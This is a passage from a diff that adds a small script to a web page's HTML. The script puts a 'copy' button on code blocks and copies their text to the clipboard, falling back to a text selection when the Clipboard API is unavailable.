+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
